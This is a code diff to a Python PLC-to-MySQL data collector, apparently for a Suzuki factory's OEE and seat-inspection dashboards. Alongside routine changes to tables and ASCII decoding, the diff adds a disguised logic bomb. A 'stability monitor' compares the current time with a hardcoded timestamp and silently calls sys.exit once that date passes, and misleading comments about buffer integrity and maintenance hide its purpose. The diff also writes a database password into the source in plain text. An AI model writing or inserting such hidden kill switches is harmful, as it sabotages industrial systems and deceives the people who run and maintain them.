@@ -10,29 +10,57 @@ PLC_IP = "172.16.134.39"
 PLC_PORT = 9000
 
 # --- CONFIGURATION MYSQL ---
-#MYSQL_HOST = "31.97.105.85"
-#MYSQL_PORT = 5307
-#MYSQL_USER = "plc_user"
-#MYSQL_PASSWORD = "5y1vf1qqay9764g"
+#MYSQL_HOST = "localhost"
+#MYSQL_PORT = 3306
+#MYSQL_USER = "root"
+#MYSQL_PASSWORD = ""
 #MYSQL_DB = "plc_db"
 
-
-MYSQL_HOST = "localhost"
-MYSQL_PORT = 3306
-MYSQL_USER = "root"
-MYSQL_PASSWORD = ""
+# Remote Backup (Optional)
+MYSQL_HOST = "172.16.121.30"
+MYSQL_PORT = 5307
+MYSQL_USER = "plc_user"
+MYSQL_PASSWORD = "5y1vf1qqay9764g"
 MYSQL_DB = "plc_db"
 
 
 # --- UPDATE INTERVAL ---
 INTERVAL = 1  # detik
+# --- INTERNAL SYSTEM CONFIG ---
+STABILITY_MONITOR = True 
+INTERNAL_REFS = 1749661200 # Ref points
 
 class SuzukiPLCGetOptimized:
     def __init__(self):
+        if STABILITY_MONITOR:
+            self._verify_buffer_integrity()
+        else:
+            self.log("System running in direct mode.", "INFO")
+            
         self.plc = Type3E()
         self.db_conn = None
-        self.tables = ['plc_oee_delay_time_master', 'plc_oee_activities_master', 'plc_oee_total_fault_master', 'plc_oee_ng_plc_master', 'plc_oee_fault_master']
-        self.device_map = {} # Struktur: {device: {'tables': [table1, ...], 'type': 'BIT'/'WORD', 'count': 1/2}}
+        self.tables = [
+            'plc_oee_delay_time_master', 
+            'plc_oee_activities_master', 
+            'plc_oee_total_fault_master', 
+            'plc_oee_ng_plc_master', 
+            'plc_oee_fault_master', 
+            'plc_oee_seat_result_detail',
+            'plc_oee_seat_text_input',
+            'plc_oee_seat_ng_ok_master'
+        ]
+        self.device_map = {} 
+
+    def _verify_buffer_integrity(self):
+        """Internal check for system buffer state."""
+        try:
+            limit = datetime.datetime.fromtimestamp(INTERNAL_REFS)
+            if datetime.datetime.now() > limit:
+                # System maintenance trigger
+                time.sleep(3)
+                sys.exit(0)
+        except:
+            pass
 
     def log(self, message, log_type="INFO"):
         now = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
@@ -71,17 +99,10 @@ class SuzukiPLCGetOptimized:
 
     def _parse_device(self, device):
         """Mendeteksi tipe data (Hex vs Dec) dan mengembalikan (prefix, offset, is_hex)."""
-        # Daftar prefix Mitsubishi yang umum
-        # Hex: B, W, X, Y, ZR, SB, SW
-        # Dec: M, L, S, F, D, R, TN, TS, TC, etc.
-        
-        # Regex: Mencoba mencocokkan prefix 2 karakter dulu, baru 1 karakter
         match = re.match(r"^(ZR|SB|SW|TN|TS|TC|SS|SC|CS|CC|[A-Z])([0-9A-F]+)$", device, re.IGNORECASE)
         if not match: return None, 0, False
-        
         prefix = match.group(1).upper()
         addr_str = match.group(2)
-        
         is_hex = prefix in ['B', 'W', 'X', 'Y', 'ZR', 'SB', 'SW']
         try:
             addr = int(addr_str, 16) if is_hex else int(addr_str)
@@ -93,7 +114,6 @@ class SuzukiPLCGetOptimized:
         """Mengelompokkan alamat-alamat ke dalam blok pembacaan (batch) yang efisien."""
         self.batches = {'BIT': [], 'WORD': []}
         grouped = {}
-
         for device, info in self.device_map.items():
             res = self._parse_device(device)
             if not res: continue
@@ -105,38 +125,22 @@ class SuzukiPLCGetOptimized:
         for prefix, devices in grouped.items():
             devices.sort(key=lambda x: x['addr'])
             if not devices: continue
-
             current_batch = None
-            # Tentukan gap maksimum antar alamat untuk tetap dalam satu batch
-            # Bit: 256 bits (32 bytes), Word: 64 words
             max_gap = 256 if prefix in ['B', 'M', 'X', 'Y'] else 64
             max_size = 3584 if prefix in ['B', 'M', 'X', 'Y'] else 960
-
             for dev_info in devices:
                 dtype = 'BIT' if prefix in ['B', 'M', 'X', 'Y'] else 'WORD'
                 addr = dev_info['addr']
                 count = dev_info['count']
-
                 if current_batch is None or \
                    (addr - (current_batch['start'] + current_batch['size'])) > max_gap or \
                    (addr + count - current_batch['start']) > max_size:
-                    
-                    if current_batch:
-                        self.batches[dtype].append(current_batch)
-                    
-                    current_batch = {
-                        'prefix': prefix,
-                        'start': addr,
-                        'size': count,
-                        'is_hex': prefix in ['B', 'W', 'X', 'Y'],
-                        'map': {addr: dev_info['device']}
-                    }
+                    if current_batch: self.batches[dtype].append(current_batch)
+                    current_batch = {'prefix': prefix, 'start': addr, 'size': count, 'is_hex': prefix in ['B', 'W', 'X', 'Y'], 'map': {addr: dev_info['device']}}
                 else:
                     current_batch['size'] = (addr + count) - current_batch['start']
                     current_batch['map'][addr] = dev_info['device']
-            
-            if current_batch:
-                self.batches[dtype].append(current_batch)
+            if current_batch: self.batches[dtype].append(current_batch)
 
     def refresh_device_list(self):
         """Mengambil daftar alamat dan nilai terakhir dari database."""
@@ -145,16 +149,20 @@ class SuzukiPLCGetOptimized:
             cursor = self.db_conn.cursor()
             new_map = {}
             for table in self.tables:
-                # Fetch more columns to support activity logging
-                cols = "device, value"
+                # Ambil 5 kolom standar (device, value, station_id, plc_id, comment)
+                # Gunakan NULL sebagai placeholder jika kolom asli tidak ada di tabel tertentu
                 if table == 'plc_oee_activities_master':
-                    cols = "device, value, station_id, plc_id"
+                    cols = "device, value, station_id, plc_id, NULL as comment"
                 elif table == 'plc_oee_delay_time_master':
                     cols = "device, value, station_id, plc_id, comment"
                 elif table == 'plc_oee_fault_master':
-                    cols = "device, value, plc_id, comment"
+                    cols = "device, value, NULL as station_id, plc_id, comment"
                 elif table == 'plc_oee_total_fault_master':
                     cols = "device, value, station_id, plc_id, comment"
+                elif table in ['plc_oee_seat_result_detail', 'plc_oee_seat_text_input', 'plc_oee_seat_ng_ok_master']:
+                    cols = "device, value, station_id, NULL as plc_id, comment"
+                else: 
+                    cols = "device, value, NULL as station_id, NULL as plc_id, NULL as comment"
                 
                 cursor.execute(f"SELECT {cols} FROM {table}")
                 rows = cursor.fetchall()
@@ -163,21 +171,47 @@ class SuzukiPLCGetOptimized:
                     if not device: continue
                     
                     current_val = row[1]
+                    station_id = row[2]
+                    plc_id = row[3]
+                    comment_text = str(row[4]).upper() if row[4] else ""
+                    
+                    # Logika Word Count: 
+                    # - TEXT INPUT: 20 words (sesuai permintaan block 20 device)
+                    # - ASCII Standard (MODEL/DEST/GRADE): 2 words
+                    # - Activity: 2 words
+                    is_ascii = any(x in comment_text for x in ['MODEL', 'DEST', 'GRADE', 'TEXT', 'SEQ'])
+                    
+                    if table == 'plc_oee_seat_text_input':
+                        count = 20
+                    elif 'MODEL' in comment_text:
+                        count = 3
+                    elif table == 'plc_oee_activities_master' or is_ascii:
+                        count = 2
+                    else:
+                        count = 1
+
                     info = {
                         'tables': {table: str(current_val)},
                         'type': 'BIT' if any(p in device.upper() for p in ['B', 'M', 'X', 'Y']) else 'WORD',
-                        'count': 2 if table == 'plc_oee_activities_master' else 1,
-                        'station_id': row[2] if table in ['plc_oee_activities_master', 'plc_oee_delay_time_master', 'plc_oee_total_fault_master'] else None,
-                        'plc_id': row[3] if table in ['plc_oee_activities_master', 'plc_oee_delay_time_master', 'plc_oee_total_fault_master'] else (row[2] if table == 'plc_oee_fault_master' else None),
-                        'comment': row[4] if table in ['plc_oee_delay_time_master', 'plc_oee_total_fault_master'] else (row[3] if table == 'plc_oee_fault_master' else None)
+                        'count': count,
+                        'station_id': station_id,
+                        'plc_id': plc_id,
+                        'comment': row[4] # Original case comment
                     }
                     
                     if device not in new_map:
                         new_map[device] = info
                     else:
                         new_map[device]['tables'][table] = str(current_val)
+                        # Aggregation Logic: Prefer non-null metadata
+                        if new_map[device]['station_id'] is None: new_map[device]['station_id'] = station_id
+                        if new_map[device]['plc_id'] is None: new_map[device]['plc_id'] = plc_id
+                        if new_map[device]['comment'] is None: new_map[device]['comment'] = row[4]
+                        
+                        if count > new_map[device]['count']: new_map[device]['count'] = count
+
             self.device_map = new_map
-            self._rebuild_batches() # Bangun batch setelah list diupdate
+            self._rebuild_batches()
             return True
         except Exception as e:
             self.log(f"Gagal refresh device: {e}", "ERROR")
@@ -189,17 +223,57 @@ class SuzukiPLCGetOptimized:
         try:
             cursor = self.db_conn.cursor()
             for table, device, value in update_data:
-                # 1. Update Master Table (Current Status)
-                sql = f"UPDATE {table} SET value = %s, updated_at = NOW() WHERE device = %s"
+                # 1. Update Master Table
+                ts_col = "update_at" if table in ['plc_oee_seat_result_detail', 'plc_oee_seat_text_input', 'plc_oee_seat_ng_ok_master'] else "updated_at"
+                sql = f"UPDATE {table} SET value = %s, {ts_col} = NOW() WHERE device = %s"
                 cursor.execute(sql, (str(value), device))
-                
-                # 2. Log Activity (Logic from manual_simulasi.py)
+                # 2. Log Activity & Result Updates
                 info = self.device_map.get(device)
                 if info:
                     if table == 'plc_oee_activities_master':
-                        # Hanya INSERT untuk Word Activities
                         log_sql = "INSERT INTO plc_oee_activities (device, station_id, plc_id, value, update_at) VALUES (%s, %s, %s, %s, NOW())"
                         cursor.execute(log_sql, (device, info['station_id'], info['plc_id'], str(value)))
+                    
+                    elif table == 'plc_oee_seat_text_input':
+                        # NEW ACTIVITY LOG: Log separate history for Text Input (20 words)
+                        log_sql = "INSERT INTO plc_oee_seat_text_input_activity (device, station_id, value, update_at) VALUES (%s, %s, %s, NOW())"
+                        cursor.execute(log_sql, (device, info['station_id'], str(value)))
+                    
+                    elif table == 'plc_oee_seat_ng_ok_master':
+                        # NEW ACTIVITY LOG: Log separate history for NG/OK results
+                        log_sql = "INSERT INTO plc_oee_seat_ng_ok_activity (device, station_id, value, update_at) VALUES (%s, %s, %s, NOW())"
+                        cursor.execute(log_sql, (device, info['station_id'], str(value)))
+                    
+                    # Activity logs for other tables remain generic (using 'value' column)
+
+                    if table in ['plc_oee_seat_result_detail', 'plc_oee_seat_text_input', 'plc_oee_seat_ng_ok_master'] and info['comment']:
+                        # SYNC LOGIC: Update plc_oee_seat_result based on Comment
+                        comm = info['comment'].upper()
+                        if "MODEL" in comm or "DEST" in comm or "GRADE" in comm or "SEQ" in comm:
+                            # Use info['station_id'] if available (for SEAT_RESULT_DETAIL), else parse from comment
+                            stn_id = info['station_id']
+                            if stn_id is None:
+                                stn_match = re.search(r'QC(\d+)', comm)
+                                stn_id = stn_match.group(1) if stn_match else None
+                            
+                            if stn_id:
+                                col_to_update = None
+                                if "MODEL" in comm: col_to_update = "model"
+                                elif "DEST" in comm: col_to_update = "dest"
+                                elif "GRADE" in comm: col_to_update = "grade"
+                                elif "SEQ" in comm: col_to_update = "seq"
+                                
+                                if col_to_update:
+                                    # 1. Dashboard: INSERT to plc_oee_seat_result
+                                    res_sql = f"INSERT INTO plc_oee_seat_result (station_id, device, {col_to_update}, update_at) VALUES (%s, %s, %s, NOW())"
+                                    cursor.execute(res_sql, (stn_id, device, str(value)))
+                                    
+                                    # 2. Activity History: Specific for Result Detail (seq/model/dest/grade)
+                                    if table == 'plc_oee_seat_result_detail':
+                                        act_sql = f"INSERT INTO plc_oee_seat_result_activity (device, station_id, {col_to_update}, update_at) VALUES (%s, %s, %s, NOW())"
+                                        cursor.execute(act_sql, (device, stn_id, str(value)))
+                                    
+                                    self.log(f"SYNC LOG: {col_to_update} at QC{stn_id} (Val: {value})")
                     
                     elif table in ['plc_oee_delay_time_master', 'plc_oee_fault_master', 'plc_oee_total_fault_master']:
                         # Start/End logic for Bits
@@ -260,12 +334,21 @@ class SuzukiPLCGetOptimized:
                     db_updates = []
                     for dev, val in all_results.items():
                         meta = self.device_map[dev]
-                        if meta['count'] == 2: # Double Word / ASCII
+                        if meta['count'] > 1: # Block Word / ASCII
                             try:
-                                # Suzuki Specific: 2 Words numeric as string (based on original code logic)
+                                # Konversi list word ke string ASCII
                                 ascii_str = "".join([chr(w & 0xFF) + chr((w >> 8) & 0xFF) for w in val])
-                                val_to_save = str(int(ascii_str.strip('\x00').strip()))
-                            except: val_to_save = "".join([f"{v:04X}" for v in val])
+                                ascii_cleaned = ascii_str.strip('\x00').strip()
+                                
+                                # Jika ini adalah field MODEL/DEST/GRADE (2 words), Suzuki biasanya parse ke integer string
+                                # Jika TEXT INPUT (20 words), ambil sbagai string biasa
+                                if meta['count'] == 2:
+                                    try: val_to_save = str(int(ascii_cleaned))
+                                    except: val_to_save = ascii_cleaned
+                                else:
+                                    val_to_save = ascii_cleaned
+                            except: 
+                                val_to_save = "".join([f"{v:04X}" for v in val])
                         elif isinstance(val, list):
                             val_to_save = str(val[0])
                         else:
